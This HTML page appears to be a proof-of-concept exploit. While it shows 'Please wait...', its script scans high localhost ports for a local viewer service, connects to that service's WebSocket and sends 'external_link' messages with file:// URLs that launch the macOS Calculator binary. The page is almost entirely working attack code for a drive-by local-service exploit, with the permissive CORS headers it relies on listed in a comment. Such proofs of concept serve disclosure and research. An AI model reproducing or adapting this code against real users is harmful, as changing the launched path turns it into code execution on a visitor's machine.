<!--
Important headers:
"Access-Control-Allow-Origin: *"
"Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept"
-->
<body>
Please wait...
<script>
    async function checkPic(url) {
        return new Promise(((resolve, reject) => {
            const img = document.createElement('img');

            img.onload = () => resolve();
            img.onerror = () => reject();

            img.src = url;
        }));
    }

    function exploit(port) {
        const socket = new WebSocket(`ws://127.0.0.1:${port}`);

        socket.addEventListener('open', () => {
            socket.send(JSON.stringify({
                type: 'external_link',
                url: 'file:///Applications/Calculator.app/Contents/MacOS/Calculator',
            }));

            socket.send(JSON.stringify({
                type: 'external_link',
                url: 'file:///System/Applications/Calculator.app/Contents/MacOS/Calculator',
            }));
        });
    }

    async function scan() {
        const minPort = 49152;
        const maxPort = 65535;

        for (let port = minPort; port < maxPort; port++) {
            try {
                await checkPic(`http://localhost:${port}/viewer/favicon.ico`);
                return port;
            } catch (_) {
            }
        }
    }

    scan().then(exploit);
</script>
</body>
